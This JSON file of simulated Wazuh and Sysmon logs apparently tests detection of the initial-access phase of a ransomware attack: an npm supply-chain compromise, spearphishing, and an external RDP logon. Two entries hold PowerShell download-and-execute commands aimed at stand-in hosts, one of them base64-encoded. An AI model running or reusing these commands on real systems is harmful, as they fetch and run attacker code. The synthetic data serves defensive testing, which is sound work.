{
  "_metadata": {
    "engagement": "ransomware",
    "phase": "initial-access",
    "phase_number": 0,
    "description": "Initial Access phase of Ransomware - example-corp",
    "techniques": [
      "T1133",
      "T1566.002",
      "T1195.002",
      "T1566.001"
    ],
    "timespan": "T+0:00:00 to T+0:14:00",
    "attacker_logic": "Attacker executes initial-access techniques",
    "format": "wazuh-native",
    "format_version": "2.0"
  },
  "attacker_profile": {
    "c2_server": "185.141.27.98",
    "initial_target": "WS01.corp.local",
    "compromised_user": "CORP\\jsmith"
  },
  "logs": [
    {
      "_comment": "NPM install running postinstall script",
      "sequence": 1,
      "relative_time": "T+0:00:00",
      "timestamp": "2026-01-30T08:00:00Z",
      "log": {
        "timestamp": "2026-01-30T08:00:00.000+0000",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Supply Chain Compromise - NPM Package",
          "id": "100100",
          "mitre": {
            "id": [
              "T1195.002"
            ],
            "tactic": [
              "Initial Access"
            ],
            "technique": [
              "Supply Chain Compromise - NPM Package"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "008",
          "name": "DEV01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.367837660",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "DEV01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 11:30:00.000",
              "processGuid": "{T1195002-0002-0001-0001-000000000001}",
              "processId": "9500",
              "image": "C:\\Program Files\\nodejs\\node.exe",
              "commandLine": "node.exe C:\\Users\\developer1\\project\\node_modules\\@corp-internal\\utils\\postinstall.js",
              "currentDirectory": "C:\\Users\\developer1\\project\\",
              "user": "CORP\\developer1",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{T1195002-0002-0001-0000-000000000001}",
              "parentProcessId": "9400",
              "parentImage": "C:\\Program Files\\nodejs\\npm.cmd",
              "parentCommandLine": "npm install"
            }
          }
        },
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "initial-access"
      }
    },
    {
      "_comment": "Postinstall script executing PowerShell",
      "sequence": 2,
      "relative_time": "T+0:01:00",
      "timestamp": "2026-01-30T08:01:00Z",
      "log": {
        "timestamp": "2026-01-30T08:01:00.000+0000",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 1: Supply Chain Compromise - NPM Package",
          "id": "100100",
          "mitre": {
            "id": [
              "T1195.002"
            ],
            "tactic": [
              "Initial Access"
            ],
            "technique": [
              "Supply Chain Compromise - NPM Package"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event1",
            "windows"
          ]
        },
        "agent": {
          "id": "008",
          "name": "DEV01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.166230028",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "1",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "DEV01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 11:30:02.000",
              "processGuid": "{T1195002-0002-0001-0001-000000000002}",
              "processId": "9600",
              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
              "commandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAC4AYwBvAG0ALwBzACcAKQA=",
              "currentDirectory": "C:\\Users\\developer1\\project\\node_modules\\@corp-internal\\utils\\",
              "user": "CORP\\developer1",
              "integrityLevel": "Medium",
              "parentProcessGuid": "{T1195002-0002-0001-0001-000000000001}",
              "parentProcessId": "9500",
              "parentImage": "C:\\Program Files\\nodejs\\node.exe",
              "parentCommandLine": "node.exe C:\\Users\\developer1\\project\\node_modules\\@corp-internal\\utils\\postinstall.js"
            }
          }
        },
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "initial-access"
      }
    },
    {
      "_comment": "Spearphishing link - PowerShell from browser",
      "sequence": 3,
      "relative_time": "T+0:02:30",
      "timestamp": "2026-01-30T08:02:30Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 1,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:39:38.409",
            "ProcessGuid": "{C257A465-WS01-0002-D760A1AE6360}",
            "ProcessId": "1200",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')\"",
            "CurrentDirectory": "C:\\Users\\mjones\\",
            "User": "EXAMPLE\\mjones",
            "IntegrityLevel": "Medium",
            "ParentProcessGuid": "{C257A465-WS01-0001-551ED0FC74DD}",
            "ParentProcessId": "1195",
            "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
            "ParentCommandLine": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\""
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T08:02:30.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "initial-access"
      }
    },
    {
      "_comment": "Spearphishing - malicious domain resolution",
      "sequence": 4,
      "relative_time": "T+0:04:30",
      "timestamp": "2026-01-30T08:04:30Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 22,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:39:44.374",
            "ProcessGuid": "{C257A465-WS01-0002-D760A1AE6360}",
            "ProcessId": "1200",
            "QueryName": "malicious.com",
            "QueryStatus": "0",
            "QueryResults": "185.220.101.100",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "User": "EXAMPLE\\mjones"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T08:04:30.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "initial-access"
      }
    },
    {
      "_comment": "Phishing attachment opened",
      "sequence": 5,
      "relative_time": "T+0:07:00",
      "timestamp": "2026-01-30T08:07:00Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 1,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:39:48.747",
            "ProcessGuid": "{C257A465-WS01-0004-9EE781894005}",
            "ProcessId": "1477",
            "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "CommandLine": "\"WINWORD.EXE\" /n \"C:\\Users\\mjones\\Downloads\\Invoice.docm\"",
            "User": "EXAMPLE\\mjones",
            "ParentProcessGuid": "{00000000-0000-0000-0000-000000000000}",
            "ParentImage": "C:\\Windows\\explorer.exe"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T08:07:00.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "initial-access"
      }
    },
    {
      "_comment": "External RDP logon from suspicious IP",
      "sequence": 6,
      "relative_time": "T+0:10:00",
      "timestamp": "2026-01-30T08:10:00Z",
      "log": {
        "winlog": {
          "channel": "Security",
          "event_id": 4624,
          "provider_name": "Microsoft-Windows-Security-Auditing",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "SubjectUserSid": "S-1-0-0",
            "SubjectUserName": "-",
            "SubjectDomainName": "-",
            "SubjectLogonId": "0x0",
            "TargetUserSid": "S-1-5-21-9812061457-3759097523-7675-1001",
            "TargetUserName": "jsmith",
            "TargetDomainName": "EXAMPLE",
            "TargetLogonId": "0x3dcc4",
            "LogonType": "10",
            "LogonProcessName": "User32",
            "AuthenticationPackageName": "Negotiate",
            "WorkstationName": "",
            "LogonGuid": "{33455042-5C6D-4807-8F5E-28C615B1E072}",
            "TransmittedServices": "-",
            "LmPackageName": "-",
            "KeyLength": "0",
            "ProcessId": "0x0",
            "ProcessName": "-",
            "IpAddress": "185.220.101.45",
            "IpPort": "52976",
            "ImpersonationLevel": "%%1833",
            "RestrictedAdminMode": "-",
            "TargetOutboundUserName": "-",
            "TargetOutboundDomainName": "-",
            "VirtualAccount": "%%1843",
            "TargetLinkedLogonId": "0x0",
            "ElevatedToken": "%%1842"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T08:10:00.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "initial-access"
      }
    },
    {
      "_comment": "Command shell after external RDP",
      "sequence": 7,
      "relative_time": "T+0:13:30",
      "timestamp": "2026-01-30T08:13:30Z",
      "log": {
        "winlog": {
          "channel": "Microsoft-Windows-Sysmon/Operational",
          "event_id": 1,
          "provider_name": "Microsoft-Windows-Sysmon",
          "computer_name": "WORKSTATION01.example.local",
          "event_data": {
            "UtcTime": "2026-01-30 11:40:02.462",
            "ProcessGuid": "{C257A465-WS01-0006-9151E68DDFCD}",
            "ProcessId": "1643",
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": "cmd.exe",
            "CurrentDirectory": "C:\\Users\\jsmith\\",
            "User": "EXAMPLE\\jsmith",
            "LogonId": "0x4bc4c",
            "IntegrityLevel": "High",
            "ParentProcessGuid": "{00000000-0000-0000-0000-000000000001}",
            "ParentProcessId": "1",
            "ParentImage": "C:\\Windows\\explorer.exe"
          }
        },
        "agent": {
          "name": "WS01",
          "id": "007"
        },
        "timestamp": "2026-01-30T08:13:30.000+0000",
        "_fomorian_test": true,
        "_fomorian_engagement": "ransomware",
        "_fomorian_phase": "initial-access"
      }
    }
  ]
}